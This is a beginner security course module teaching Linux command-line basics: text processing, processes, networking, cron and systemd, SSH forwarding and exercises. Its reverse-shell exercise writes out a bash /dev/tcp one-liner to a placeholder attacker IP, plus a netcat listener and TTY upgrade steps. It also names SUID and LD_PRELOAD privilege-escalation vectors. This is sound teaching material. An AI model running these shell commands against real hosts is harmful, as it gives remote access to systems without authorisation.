---
title: "Essential Linux for security"
area: "Fundamentals"
order: 2
level: "beginner"
summary: "The bash shell, the commands you'll use every day, scripting, process management, basic networking, automation with cron and systemd. Without knowing how to drive Linux you won't survive a month in security."
prereq:
  - "Section 01"
  - "A Kali or Ubuntu VM"
tools:
  - "bash, coreutils"
  - "grep, awk, sed, jq"
  - "tmux"
  - "vim or nano"
  - "systemd, cron"
---

# Essential Linux for security

> There is a saying: *"Real hackers use Linux."* It's as silly as you want, but 90% of offensive and defensive tools are made-for-Linux. Even if you defend Windows servers, your work workstation is often Linux/macOS. Learn it.

## Unix philosophy in 4 points

1. Every program does **one thing only**, well.
2. Programs **combine** via pipes (`|`).
3. Everything is a **file** (or almost).
4. Everything is **text** (logs, configs, command output) -> you can grep it, awk it, sed it.

In practice: instead of one mega-tool that does everything, a chain of commands:

```bash
cat /var/log/auth.log | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -rn | head -20
```

This finds the top 20 IPs that attempted failed SSH logins. **One line.**

## Filesystem and paths

Standard layout (FHS — Filesystem Hierarchy Standard):

| Path | What it's for |
|---|---|
| `/` | filesystem root |
| `/bin`, `/usr/bin` | public executables |
| `/sbin`, `/usr/sbin` | system executables (root) |
| `/lib`, `/usr/lib` | shared libraries |
| `/etc` | global configuration |
| `/home/<user>` | user home directories |
| `/root` | root's home |
| `/var/log` | system and service logs |
| `/var/spool` | queues (cron, mail) |
| `/tmp`, `/var/tmp` | temporary files (sticky bit) |
| `/proc` | pseudo-fs: kernel and process state |
| `/sys` | pseudo-fs: kernel devices |
| `/dev` | device files |
| `/opt` | optional third-party software |

In security you will very often use `/etc` (config), `/var/log` (analysis), `/tmp` (writable as unprivileged user), `/proc` (process info).

### Absolute vs relative paths

- Absolute: starts from `/` -> `/usr/bin/ls`
- Relative: starts from the current dir (`pwd`) -> `../bin/ls`
- `~` = current user's home, `~alice` = alice's home
- `.` = current dir, `..` = parent

**Dangerous habit:** `./script.sh` runs the script *here*; but `script.sh` (without `./`) runs it if it's in `PATH`. Never put `.` in PATH (if you put `ls` in `/tmp` and someone types `ls` while in `/tmp`, it runs your file).

## The commands you must have as muscle memory

### Navigation and basic info

```bash
pwd                       # where am I?
cd /etc                   # change dir
cd -                      # back to previous dir
ls -lah                   # list, long, all, human
ls -lah --color=auto
tree -L 2 /etc            # tree structure
file binary               # file type
stat file                 # metadata (permissions, inode, atime/ctime/mtime)
du -sh /var/log/*         # space used
df -h                     # disk space
mount                     # what is mounted
```

### Viewing files

```bash
cat file                  # everything (watch out for huge files!)
less file                 # paginated, search with / and n
head -n 20 file
tail -n 50 file
tail -F /var/log/syslog   # follow live
wc -l file                # count lines
```

### Searching

```bash
find / -name "*.conf" -type f 2>/dev/null
find / -mtime -1                # modified in last 24h
find / -size +100M
find / -perm -4000 -user root   # SUID root
grep -r "password" /etc 2>/dev/null
grep -i -n "error" file         # case-insensitive, line numbers
grep -E "regex"                 # extended regex
grep -P "pcre regex"            # perl-compatible regex (more powerful)
```

### Text manipulation (the daily bread)

```bash
# cut: extract columns
cut -d: -f1 /etc/passwd        # usernames only

# sort + uniq
sort file | uniq                # remove duplicates (file must be sorted)
sort file | uniq -c | sort -rn  # count and sort by frequency desc

# awk: the Swiss Army knife
awk -F: '{print $1, $3}' /etc/passwd        # username and UID
awk '$3 == 0 {print $1}' /etc/passwd        # users with UID 0 (root)
awk 'NR>1 && /WARN/ {print $1, $5}' log

# sed: in-place substitutions
sed -i 's/old/new/g' file       # substitute everywhere
sed -n '10,20p' file            # print lines 10-20
sed '/^#/d' config              # remove comments

# tr: translate characters
echo "HELLO" | tr 'A-Z' 'a-z'    # -> hello
tr -d '\r' < winfile > linuxfile  # remove CR

# tee: redirect but also stdout
command | tee output.log
```

### Permissions and ownership

```bash
chmod 755 file               # rwxr-xr-x
chmod u+x script.sh          # add execute for user
chmod -R g+w dir
chown alice:dev file
chown -R alice:dev dir
umask 027                    # default: new files 640, dirs 750
```

### Processes

```bash
ps aux                       # all processes
ps -ef
pgrep -fa nginx              # PIDs of processes with matching cmdline
pstree -p                    # tree with PIDs
top                          # interactive
htop                         # prettier (install it)
kill 1234                    # SIGTERM
kill -9 1234                 # SIGKILL (no grace)
killall -u alice firefox     # all of alice's firefox
nohup ./long-job &           # detached
jobs                         # background jobs of current shell
fg %1
bg %1
disown
```

### Networking

```bash
ip addr                      # interfaces
ip route                     # routing table
ss -tulpn                    # listening sockets (TCP+UDP, listening, processes, numeric)
ss -tan state established
ss -tn '( dport = :443 )'
ping -c 4 example.com
traceroute example.com
mtr example.com              # ping + traceroute combined
dig example.com              # DNS
dig +short MX example.com
host example.com
curl -v https://example.com
curl -I https://example.com  # headers only
wget -r --no-parent https://example.com/path/
nc -lvnp 4444                # netcat listener
nc -zv host 80               # port check
```

### Transfers

```bash
scp file user@host:/path/
rsync -av --progress src/ dst/
rsync -av -e "ssh -p 2222" src/ user@host:/path/
sftp user@host
```

### Compression and archives

```bash
tar czvf archive.tar.gz dir/
tar xzvf archive.tar.gz
tar tvf archive.tar.gz       # list
zip -r archive.zip dir/
unzip archive.zip
7z x archive.7z
```

### `man`, `--help`, and other docs

Always. `man find`, `info coreutils`, `tldr <cmd>` (summaries of real-world examples).

## Redirection and pipes

```bash
cmd > file                  # stdout to file (overwrite)
cmd >> file                 # append
cmd 2> err                  # stderr to file
cmd > file 2>&1             # stdout+stderr to file
cmd &> file                 # same (bash)
cmd 2>/dev/null             # discard stderr (useful in finds)
cmd1 | cmd2                 # stdout of cmd1 -> stdin of cmd2
cmd1 |& cmd2                # also stderr
cmd < input.txt             # stdin from file
diff <(cmd1) <(cmd2)        # process substitution
```

Real examples:
```bash
# find files modified yesterday and count them per dir
find / -mtime -1 -type f 2>/dev/null | awk -F/ '{print $2"/"$3}' | sort | uniq -c | sort -rn

# most active IPs in Apache logs
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20
```

## Variables, expansions, quoting

```bash
NAME=alice              # no spaces around the =
echo $NAME
echo "$NAME"            # quoting: variable expanded
echo '$NAME'            # quoting: literal, NOT expanded
echo `date`             # backticks: legacy command substitution
echo $(date)            # preferred
LIST=$(ls)
echo ${NAME:-default}   # if NAME empty, "default"
echo ${VAR:?error}      # if VAR empty, error with message
echo ${PATH/:/, }       # substitution
```

**Important:** in security you'll often handle paths with spaces or odd characters. **Always quote** filenames: `rm "$file"`, not `rm $file`.

### Environment variables

```bash
export DEBUG=1
env                          # all of them
printenv PATH
set                          # vars + shell functions
unset DEBUG
```

`PATH`, `HOME`, `USER`, `SHELL`, `LD_PRELOAD`, `LD_LIBRARY_PATH` — important to know.

> **Security trivia:** `LD_PRELOAD` allows loading a shared library before the others. It's a classic privesc/persistence vector when poorly managed. On SUID binaries it is ignored for security reasons (barring exotic configurations).

## Bash scripting

Commented example:

```bash
#!/usr/bin/env bash
set -euo pipefail              # -e: exit on error; -u: undef var = error; -o pipefail: pipe error propagates
IFS=$'\n\t'                    # safe IFS

# Function
log() {
    echo "[$(date +%H:%M:%S)] $*" >&2
}

# Positional argument
target="${1:-127.0.0.1}"
log "Scanning $target"

# Loops and conditions
for port in 22 80 443 8080; do
    if nc -z -w1 "$target" "$port" 2>/dev/null; then
        log "Port $port OPEN"
    else
        log "Port $port closed"
    fi
done

# Array
ports=(22 80 443 8080)
for p in "${ports[@]}"; do
    echo "port $p"
done

# Case
case "$1" in
    start) systemctl start nginx ;;
    stop)  systemctl stop nginx ;;
    *)     echo "usage: $0 {start|stop}"; exit 1 ;;
esac
```

Things to know:
- `[ ... ]` POSIX test, `[[ ... ]]` bash test (more powerful, regex).
- `$?` exit status of last command.
- `$$` PID of the script.
- `$#` number of arguments, `$@` all of them, `$1`–`$9` positional, `${10}` past 9.
- Functions: `func() { ...; return 0; }`.

**Common mistakes:**

- Wrong spaces in assignments: `X = 1` doesn't work, it's a call to command `X` with arguments `=` and `1`.
- `read -p "msg: " var` is bash-only; POSIX uses `printf` + `read`.
- `[[ $a -gt $b ]]` for integers, `[[ $a > $b ]]` for strings (lexical).

### Exercise 2.1 — Write a script
Write `monitor.sh` that, given a host:
- pings it every 10s,
- if 3 consecutive pings fail, writes to log `alert.log` with timestamp,
- otherwise to `up.log`,
- stops cleanly with Ctrl-C (trap).

<details><summary>Solution</summary>

```bash
#!/usr/bin/env bash
set -euo pipefail
host="${1:?usage: $0 <host>}"
fails=0
trap 'echo; echo "stop"; exit 0' INT TERM

while true; do
    if ping -c1 -W2 "$host" >/dev/null 2>&1; then
        fails=0
        echo "$(date -Is) $host up" >> up.log
    else
        fails=$((fails+1))
        if [ "$fails" -ge 3 ]; then
            echo "$(date -Is) ALERT $host down (3 in a row)" >> alert.log
            fails=0  # avoid spam
        fi
    fi
    sleep 10
done
```

</details>

## Cron and systemd timers

### Cron (old but alive)

`crontab -e` to edit your own:

```cron
# m h dom mon dow cmd
*/5 * * * * /usr/local/bin/sync.sh
0 3 * * 0   /usr/local/bin/backup-weekly.sh
@reboot     /usr/local/bin/start-tunnel.sh
```

For system cron: `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`. All of these are preferred targets for malware **persistence**.

### systemd timers (modern)

```ini
# /etc/systemd/system/backup.timer
[Unit]
Description=Daily backup
[Timer]
OnCalendar=daily
Persistent=true
[Install]
WantedBy=timers.target
```

Associated service `/etc/systemd/system/backup.service`. Enable with `systemctl enable --now backup.timer`.

`systemctl list-timers --all` to see them all. **Common persistence** for modern malware.

### systemd services

```ini
# /etc/systemd/system/myapp.service
[Unit]
Description=My App
After=network.target

[Service]
Type=simple
User=myapp
ExecStart=/usr/local/bin/myapp
Restart=on-failure
# Hardening
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
CapabilityBoundingSet=CAP_NET_BIND_SERVICE

[Install]
WantedBy=multi-user.target
```

Knowing the hardening directives matters: you'll review services and say "why is this running as root and without `ProtectSystem`?".

## SSH (you'll use it 100 times a day)

Configuration `~/.ssh/config`:

```ssh-config
Host pivot
    HostName 10.10.10.10
    User alice
    Port 2222
    IdentityFile ~/.ssh/id_ed25519_pivot
    ServerAliveInterval 30

Host internal
    HostName 192.168.50.5
    User bob
    ProxyJump pivot
```

Then: `ssh internal` and it brings you through the pivot automatically.

**Generate secure keys:**
```bash
ssh-keygen -t ed25519 -C "alice@laptop"
```

**Port forwarding (extremely useful in internal pentests):**
```bash
# Local forwarding: local port 8080 -> port 80 on remote host (as seen from the VPS)
ssh -L 8080:internal.host:80 user@vps

# Remote forwarding: whoever connects to VPS:9000 lands on your localhost:22
ssh -R 9000:localhost:22 user@vps

# Dynamic (SOCKS5 proxy)
ssh -D 1080 user@vps
# then configure your tools to use SOCKS5 127.0.0.1:1080
```

**SSH server hardening (`/etc/ssh/sshd_config`):**
- `PermitRootLogin no`
- `PasswordAuthentication no` (keys only)
- `MaxAuthTries 3`
- `AllowUsers alice bob`
- `Protocol 2`
- `ClientAliveInterval 300`
- Disable weak algorithms.

## tmux: living without losing sessions

When you're on SSH and the link drops, you lose running commands. `tmux` saves the session on the server side.

```bash
tmux new -s work        # new session
# (work)
# Ctrl-b d              detach
tmux ls
tmux attach -t work     # reattach

# Inside tmux (Ctrl-b is the prefix)
# c    new window
# n/p  next/prev window
# %    vertical split
# "    horizontal split
# arrows navigate between panes
# [    copy/scroll mode
# d    detach
```

For four panes always live with monitoring, scripting, log and shell, tmux is unbeatable.

## Utilities that will save you

- **jq** — JSON query. `cat file.json | jq '.users[] | select(.role=="admin") | .email'`
- **yq** — like jq but for YAML.
- **xargs** — build commands from stdin. `cat targets.txt | xargs -I {} nmap -sV {}`.
- **parallel** (GNU parallel) — parallel execution. `cat hosts | parallel -j10 ssh {} uptime`.
- **ripgrep (rg)** — blazing-fast grep, respects gitignore.
- **fd** — modern find.
- **fzf** — interactive fuzzy finder.
- **bat** — `cat` with syntax highlighting.
- **htop**, **iotop**, **iftop**, **nethogs** — monitoring.
- **strace**, **ltrace** — syscall / libcall tracing. You'll use strace to figure out what a suspicious binary is doing.
- **lsof** — lists open files and sockets (`lsof -i :443`, `lsof -p PID`).

## Minimal vim to survive

When you're on SSH, vim is often the only editor available.

```text
i       insert mode
ESC     normal mode
:w      save
:q      quit
:wq     save+quit
:q!     quit no save

# normal mode movement
h j k l   left down up right
w / b     word forward / backward
gg / G    start / end of file
0 / $     start / end of line
ngg       go to line n

# edit
dd        delete line
yy        yank line
p         paste
u         undo
Ctrl-r    redo
/text     search
n / N     next / prev match
:%s/a/b/g substitute everywhere
```

If vim is too much, nano works just fine.

## Exercises

### Exercise 2.2 — One-liner forensics
Write a pipe that, given `/var/log/auth.log` (or equivalent), finds:
- Top 10 IPs with the most failed SSH logins.
- List of usernames that were tried.
- Hourly distribution of attempts.

<details><summary>Solution</summary>

```bash
# Top 10 failed IPs
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10

# Attempted usernames
grep -oP "Failed password for (invalid user )?\K\S+" /var/log/auth.log | sort | uniq -c | sort -rn

# Hourly distribution
grep "Failed password" /var/log/auth.log | awk '{print $3}' | cut -d: -f1 | sort | uniq -c
```

</details>

### Exercise 2.3 — Reverse shell catcher
1. On Kali: `nc -lvnp 4444`
2. On Ubuntu target: `bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1`
3. You get a "dumb shell" on Kali. Run `id`, `whoami`, `uname -a`.

Now "upgrade it" to a full (TTY) shell with these three steps:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z (suspend)
stty raw -echo; fg
export TERM=xterm
```

Why this procedure? What do the steps mean?

<details><summary>Explanation</summary>

`bash -i >& /dev/tcp/IP/PORT 0>&1` is a *bash reverse shell* that uses the "magic file" `/dev/tcp` (a bash builtin) to open a TCP socket, redirecting stdin/stdout/stderr to it. When Kali receives the connection, you have a shell. But it's "dumb" — no working Ctrl-C, no tab completion, no usable vim.

The upgrade:
1. `python3 -c 'pty.spawn(...)'` opens a new pty (pseudo-terminal) and spawns bash on top of it -> now you have an interactive terminal on the target side.
2. Ctrl-Z backgrounds the `nc` shell on the attacker side.
3. `stty raw -echo` puts the local terminal into "pass everything to the child" mode without local echo.
4. `fg` brings `nc` back to foreground.
5. `export TERM=xterm` sets the terminal type to support colors/advanced commands.

</details>

### Exercise 2.4 — Persistence detection
On a VM, create (with cron and with systemd timer) two harmless "backdoors" (e.g. a script that writes a file in `/tmp` every 5 min). Then, pretend to be the defender: find all forms of persistence on the system. Also consider:

- `crontab -l` for each user
- `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/anacrontab`
- `systemctl list-timers --all`
- `systemctl list-units --type=service`
- `~/.bashrc`, `~/.profile`, `/etc/profile.d/*`
- `~/.config/autostart/*.desktop`
- `/etc/init.d/`, `/etc/rc.local`
- files with recent caps or setuid

<details><summary>Hint</summary>

A useful triage script:
```bash
echo "=== crontab for user $USER ==="; crontab -l 2>/dev/null
echo "=== /etc/cron.* ==="; ls -la /etc/cron.* 2>/dev/null
echo "=== systemd timers ==="; systemctl list-timers --all
echo "=== profile scripts ==="; ls -la /etc/profile.d/ ~/.bashrc ~/.profile 2>/dev/null
echo "=== rc.local ==="; cat /etc/rc.local 2>/dev/null
```

Dedicated tools exist: `LinPEAS`, `linenum`, `linux-smart-enumeration`.

</details>

### Exercise 2.5 — Quick triage of a compromised box
Write (or adapt) a script that collects quick information on a suspicious machine: users, last logins, active processes, network, cron, recent suid, files modified in the last 24 hours. Output in markdown.

### Exercise 2.6 — OverTheWire Bandit
Go to [overthewire.org/wargames/bandit](https://overthewire.org/wargames/bandit/) and complete the first 15 levels. They are guided shell exercises that will *really* get you comfortable with the terminal. **Don't skip them.** They are the rite of passage for anyone starting out.

## Key concepts

1. **Unix philosophy:** small programs that combine.
2. **Pipes, redirects, grep/awk/sed:** you *transform* data on textual streams.
3. **Permissions, SUID, capabilities:** privesc basics.
4. **systemd and cron:** where malware does persistence.
5. **SSH with forwarding (L/R/D):** the foundation of pivoting in pentests.
6. **strace / lsof:** they tell you *what a binary is really doing*.

You'll learn the same things by heart for Windows in upcoming sections. Linux, however, is the standard.
